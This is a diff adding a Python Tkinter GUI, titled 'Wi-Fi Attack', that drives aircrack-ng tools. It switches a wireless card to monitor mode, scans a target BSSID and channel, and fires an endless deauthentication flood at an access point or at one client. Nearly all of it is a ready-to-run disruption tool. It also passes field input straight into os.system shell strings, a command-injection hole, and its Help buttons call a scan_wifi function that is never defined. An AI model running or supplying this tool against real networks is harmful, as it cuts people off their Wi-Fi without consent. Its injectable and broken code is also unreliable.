@@ -1,0 +1,77 @@
+import os
+import time
+import subprocess
+from tkinter import *
+
+root = Tk()
+root.title("Wi-Fi Attack")
+
+# network interface-mon
+iwconfig_output = subprocess.check_output(['iwconfig']).decode('utf-8')
+iwconfig_label = Label(root, text=iwconfig_output)
+iwconfig_label.pack()
+
+interface_label = Label(root, text="What is your network interface name?")
+interface_label.pack()
+interface_entry = Entry(root)
+interface_entry.pack()
+
+def on_monitoring_click():
+    interface = interface_entry.get()
+    os.system('airmon-ng start ' + interface)
+    os.system('airmon-ng check kill ' + interface)
+
+monitoring_label = Label(root, text="Do you want the network change to Monitor?")
+monitoring_label.pack()
+monitoring_button = Button(root, text="Yes", command=on_monitoring_click)
+monitoring_button.pack()
+
+bssid_label = Label(root, text="Enter the BSSID of the Wi-Fi:")
+bssid_label.pack()
+bssid_entry = Entry(root)
+bssid_entry.pack()
+
+def bssid_help():
+    scan_wifi()
+
+bssid_help_button = Button(root, text="Help", command=bssid_help)
+bssid_help_button.pack()
+
+def find_ch():
+    bssid = bssid_entry.get()
+    ch = ch_entry.get()
+    interface = interface_entry.get()
+    os.system(f"airodump-ng --bssid {bssid} -c {ch} " + interface) # final scan
+
+ch_label = Label(root, text="Enter the channel of the Wi-Fi:")
+ch_label.pack()
+ch_entry = Entry(root)
+ch_entry.pack()
+
+def ch_help():
+    scan_wifi()
+
+ch_help_button = Button(root, text="Help", command=ch_help)
+ch_help_button.pack()
+
+check_button = Button(root, text="Check", command=find_ch)
+check_button.pack()
+
+def attack():
+    bssid = bssid_entry.get()
+    interface = interface_entry.get()
+    destination = destination_entry.get()
+    if destination:
+        os.system(f"aireplay-ng --deauth 0 -a {bssid} -c {destination} {interface}")
+    else:
+        os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}")
+
+destination_label = Label(root, text="Enter the Wi-Fi client essid (leave blank for broadcast attack):")
+destination_label.pack()
+destination_entry = Entry(root)
+destination_entry.pack()
+
+attack_button = Button(root, text="Attack", command=attack)
+attack_button.pack()
+
+root.mainloop()
